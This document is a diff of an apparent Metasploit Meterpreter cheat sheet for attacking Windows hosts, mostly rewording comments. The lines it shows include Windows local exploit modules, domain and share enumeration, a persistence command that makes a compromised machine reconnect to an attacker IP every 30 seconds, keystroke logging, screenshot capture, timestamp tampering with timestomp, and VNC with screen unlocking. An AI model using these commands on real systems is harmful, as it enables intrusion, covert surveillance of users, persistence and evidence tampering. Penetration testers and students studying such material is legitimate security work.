@@ -199,13 +199,13 @@ set LPORT 444
 exploit
 
 - Option 6
-use exploit/windows/local/                                  There are currently 77 options - 12/29/19
+use exploit/windows/local/                                  Currently 89 options - 6/30/20
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Windows enumeration
 
-run post/windows/gather/enum_domain                         Identifies the primary domain via the registry
-run post/windows/gather/enum_domains                        Enumerates the domains a host can see and the domain controllers for that domain
+run post/windows/gather/enum_domain                         Identify the primary domain via the registry
+run post/windows/gather/enum_domains                        Enumerate the domains a host can see and the domain controllers for that domain
 run post/windows/gather/enum_logged_on_users                Enumerate current and recently logged on Windows users
 run post/windows/gather/enum_shares                         Enumerate configured and recently used file shares
 
@@ -263,6 +263,7 @@ Option 1
 run persistence -h
 run persistence <starts at computer startup> <tries to connect every 30s> <attacker port> <attacker IP>
 run persistence -X -i 30 -p 443 -r <attacker IP>
+
 Notice that it shows where the file is stored on the Windows machine.
 It also gives you the location of the Meterpreter resource file you can run to remove persistence.
 
@@ -407,19 +408,19 @@ exploit
 
 # Misc
 
-idletime                                                    Returns the number of seconds the remote user has been idle
-  If time < 5 min
-  keyscan_start                                             Start capturing keystrokes
-  keyscan_stop                                              Stop capturing keystrokes
-  keyscan_dump                                              Dump the keystroke buffer
+idletime                                                    Number of seconds the remote user has been idle
+
+If time < 5 min
+keyscan_start                                               Start capturing keystrokes
+keyscan_stop                                                Stop capturing keystrokes
+keyscan_dump                                                Dump the keystroke buffer
 
 screenshot                                                  Grab a screenshot of the interactive desktop
 
 timestomp                                                   Manipulate file MACE attributes
 
-run vnc
-  If the screen is locked exit VNC
-  Run screen_unlock
+run vnc                                                     If the screen is locked exit VNC
+run screen_unlock
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Database
